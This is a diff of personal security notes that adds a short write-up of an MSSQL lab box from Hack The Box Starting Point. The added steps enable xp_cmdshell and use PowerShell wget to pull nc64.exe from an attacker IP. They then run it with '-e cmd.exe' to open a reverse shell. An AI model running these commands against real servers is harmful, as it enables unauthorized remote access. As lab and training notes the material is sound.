@@ -564,8 +564,20 @@ The server generates a random number and sends it as a challenge to the client. 
  - ` ssh paradox@10.10.35.239 -i paradox 2049:localhost:2049` port forwarding if local mounting is not allowed
  - `mount -t nfs localhost:/ nfs/` after mounting locally
  
-## Impacket
- - python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth
+## MSSQL writeup
+ - From HTB starting point
+ - nmap to get stuff
+ - `smbclient \\\\10.10.107.161\\backup` to get data.
+ - python3 mssqlclient.py ARCHETYPE/sql_svc@{TARGET_IP} -windows-auth.
+ - once connected, can `xp_cmdshell` can execute commands, might need to enter the following to enable xp_cmdshell `EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+sp_configure; - Enabling the sp_configure as stated in the above error message
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;`
+ - Make the victim download `https://github.com/int0x33/nc.exe/blob/master/nc64.exe?source=post_page-----a2ddc3557403----------------------`
+ -`xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.22/nc64.exe -outfile nc64.exe"`
+ - Listen on ur machine and on victim `xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.129.113.162 443"`
+
 # Blue team notes
  - yara <path to specific yara rule file> target
  - python loki.py -p .  (loki is an alternative)
